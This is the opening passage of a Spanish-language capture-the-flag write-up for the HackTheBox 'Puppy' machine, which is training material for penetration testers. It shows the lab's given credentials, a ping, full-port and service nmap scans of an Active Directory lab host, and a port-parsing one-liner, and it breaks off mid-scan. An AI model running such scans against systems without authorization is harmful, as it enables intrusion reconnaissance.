<!DOCTYPE html>
<html lang="es">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  Puppy CTF ¬∑ 0xDaveey
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="David Le√≥n">
<meta name="description" content="
  M√°quina Puppy
  
    
    Link to heading
  

Dificultad: Media
Descripci√≥n: Como es com√∫n en las pruebas de penetraci√≥n de la vida real, iniciar√° el cuadro Puppy con credenciales para la siguiente cuenta: levi.james / KingofAkron2025.

  Enumeraci√≥n
  
    
    Link to heading
  

Comenzamos haciendo un ping a la m√°quina objetivo():
$ ping -c1 10.10.11.70                          
PING 10.10.11.70 (10.10.11.70) 56(84) bytes of data.
64 bytes from 10.10.11.70: icmp_seq=1 ttl=127 time=81.1 ms

--- 10.10.11.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 81.143/81.143/81.143/0.000 ms
Confirmamos que es una m√°quina Windows, enumeramos puertos abiertos:">
<meta name="keywords" content="blog,hacking,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Puppy CTF">
  <meta name="twitter:description" content="M√°quina PuppyLink to headingDificultad: Media
Descripci√≥n: Como es com√∫n en las pruebas de penetraci√≥n de la vida real, iniciar√° el cuadro Puppy con credenciales para la siguiente cuenta: levi.james / KingofAkron2025.
Enumeraci√≥nLink to headingComenzamos haciendo un ping a la m√°quina objetivo():
$ ping -c1 10.10.11.70 PING 10.10.11.70 (10.10.11.70) 56(84) bytes of data. 64 bytes from 10.10.11.70: icmp_seq=1 ttl=127 time=81.1 ms --- 10.10.11.70 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.143/81.143/81.143/0.000 ms Confirmamos que es una m√°quina Windows, enumeramos puertos abiertos:">

<meta property="og:url" content="http://localhost:1313/posts/puppy/">
  <meta property="og:site_name" content="0xDaveey">
  <meta property="og:title" content="Puppy CTF">
  <meta property="og:description" content="M√°quina PuppyLink to headingDificultad: Media
Descripci√≥n: Como es com√∫n en las pruebas de penetraci√≥n de la vida real, iniciar√° el cuadro Puppy con credenciales para la siguiente cuenta: levi.james / KingofAkron2025.
Enumeraci√≥nLink to headingComenzamos haciendo un ping a la m√°quina objetivo():
$ ping -c1 10.10.11.70 PING 10.10.11.70 (10.10.11.70) 56(84) bytes of data. 64 bytes from 10.10.11.70: icmp_seq=1 ttl=127 time=81.1 ms --- 10.10.11.70 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.143/81.143/81.143/0.000 ms Confirmamos que es una m√°quina Windows, enumeramos puertos abiertos:">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-10-05T00:00:00+00:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Medium">
    <meta property="article:tag" content="Hackthebox">
      <meta property="og:see_also" content="http://localhost:1313/posts/cap/">




<link rel="canonical" href="http://localhost:1313/posts/puppy/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      0xDaveey
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">Sobre m√≠</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/projects/">Proyectos</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/contact/">Cont√°ctame</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="http://localhost:1313/posts/puppy/">
              Puppy CTF
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-10-05T00:00:00Z">
                octubre 5, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              13 minutos de lectura.
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/0xdaveey/">0xDaveey</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="/categories/pentesting/">Pentesting</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/ctf/">CTF</a>
    </span>
      <span class="separator">‚Ä¢</span>
    <span class="tag">
      <a href="/tags/medium/">Medium</a>
    </span>
      <span class="separator">‚Ä¢</span>
    <span class="tag">
      <a href="/tags/hackthebox/">Hackthebox</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h1 id="m√°quina-puppy">
  M√°quina Puppy
  <a class="heading-link" href="#m%c3%a1quina-puppy">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>Dificultad</strong>: <em>Media</em></p>
<p><strong>Descripci√≥n</strong>: Como es com√∫n en las pruebas de penetraci√≥n de la vida real, iniciar√° el cuadro Puppy con credenciales para la siguiente cuenta: levi.james / KingofAkron2025.</p>
<h1 id="enumeraci√≥n">
  Enumeraci√≥n
  <a class="heading-link" href="#enumeraci%c3%b3n">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Comenzamos haciendo un ping a la m√°quina objetivo():</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>                          
</span></span><span class="line"><span class="cl"><span class="no">PING</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">127</span> <span class="n">time</span><span class="o">=</span><span class="mi">81</span><span class="o">.</span><span class="mi">1</span> <span class="n">ms</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="n">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">0</span><span class="n">ms</span>
</span></span><span class="line"><span class="cl"><span class="n">rtt</span> <span class="n">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="n">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mi">81</span><span class="o">.</span><span class="mi">143</span><span class="o">/</span><span class="mi">81</span><span class="o">.</span><span class="mi">143</span><span class="o">/</span><span class="mi">81</span><span class="o">.</span><span class="mi">143</span><span class="o">/</span><span class="mi">0</span><span class="o">.</span><span class="mo">000</span> <span class="n">ms</span></span></span></code></pre></div>
<p>Confirmamos que es una m√°quina <code>Windows</code>, enumeramos puertos abiertos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">n</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">/</span><span class="n">allPorts</span>
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mo">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">58</span> <span class="no">EDT</span>
</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>
</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">65513</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="n">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
</span></span><span class="line"><span class="cl"><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
</span></span><span class="line"><span class="cl"><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
</span></span><span class="line"><span class="cl"><span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>
</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
</span></span><span class="line"><span class="cl"><span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">nfs</span>
</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
</span></span><span class="line"><span class="cl"><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>
</span></span><span class="line"><span class="cl"><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49674</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">49689</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">55651</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</span></span><span class="line"><span class="cl"><span class="mi">55687</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span></span></span></code></pre></div>
<p>Copiamos en nuestra clipboard los puertos(porque son muchos üòÖ) con nuestro oneliner:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nv">host</span><span class="o">=</span><span class="k">$(</span>awk <span class="s1">&#39;/Host:/ {print $2; exit}&#39;</span> nmap/allPorts<span class="k">)</span><span class="p">;</span> <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>grep -oP <span class="s1">&#39;\d+/open&#39;</span> nmap/allPorts <span class="p">|</span> cut -d<span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span><span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;host: </span><span class="nv">$host</span><span class="s2">&#34;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;ports open: </span><span class="nv">$ports</span><span class="s2">&#34;</span><span class="p">;</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$ports</span><span class="s2">&#34;</span> <span class="p">|</span> xclip -sel clip
</span></span><span class="line"><span class="cl">host: 10.10.11.70
</span></span><span class="line"><span class="cl">ports open: 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,5985,9389,49664,49667,49669,49674,49689,55651,55687</span></span></code></pre></div>
<p>Ejecutamos una serie de scripts b√°sicos de reconocimiento para ver que corren en estos puertos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">2049</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49669</span><span class="p">,</span><span class="mi">49674</span><span class="p">,</span><span class="mi">49689</span><span class="p">,</span><span class="mi">55651</span><span class="p">,</span><span class="mi">55687</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span>
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">95</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mo">04</span> <span class="mi">18</span><span class="p">:</span><span class="mo">06</span> <span class="no">EDT</span>
</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>
</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">084</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">VERSION</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="p">(</span><span class="n">generic</span> <span class="n">dns</span> <span class="ss">response</span><span class="p">:</span> <span class="no">SERVFAIL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="ss">strings</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="no">DNS</span><span class="o">-</span><span class="no">SD</span><span class="o">-</span><span class="ss">TCP</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_services</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_dns</span><span class="o">-</span><span class="n">sd</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_udp</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">local</span>
</span></span><span class="line"><span class="cl"><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="ss">time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mo">05</span> <span class="mo">05</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">58</span><span class="n">Z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>       <span class="mi">2</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="no">RPC</span> <span class="c1">#100000)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="ss">rpcinfo</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">program</span> <span class="n">version</span>    <span class="n">port</span><span class="o">/</span><span class="n">proto</span>  <span class="n">service</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">rpcbind</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">rpcbind</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">udp</span>   <span class="n">rpcbind</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">rpcbind</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100003</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span>         <span class="mi">2049</span><span class="o">/</span><span class="n">udp</span>   <span class="n">nfs</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100003</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span>         <span class="mi">2049</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">nfs</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>       <span class="mi">2049</span><span class="o">/</span><span class="n">udp</span>   <span class="n">mountd</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>       <span class="mi">2049</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">mountd</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>     <span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">nlockmgr</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>     <span class="mi">2049</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">nlockmgr</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>     <span class="mi">2049</span><span class="o">/</span><span class="n">udp</span>   <span class="n">nlockmgr</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>     <span class="mi">2049</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">nlockmgr</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">udp</span>   <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">100024</span>  <span class="mi">1</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="ss">Domain</span><span class="p">:</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB0</span><span class="o">.</span><span class="p">,</span> <span class="ss">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5?</span>
</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mi">1</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">tcpwrapped</span>
</span></span><span class="line"><span class="cl"><span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">nlockmgr</span>      <span class="mi">1</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="no">RPC</span> <span class="c1">#100021)</span>
</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="ss">Domain</span><span class="p">:</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB0</span><span class="o">.</span><span class="p">,</span> <span class="ss">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>
</span></span><span class="line"><span class="cl"><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>          <span class="no">Microsoft</span> <span class="no">HTTPAPI</span> <span class="n">httpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">SSDP</span><span class="o">/</span><span class="no">UPnP</span><span class="p">)</span>
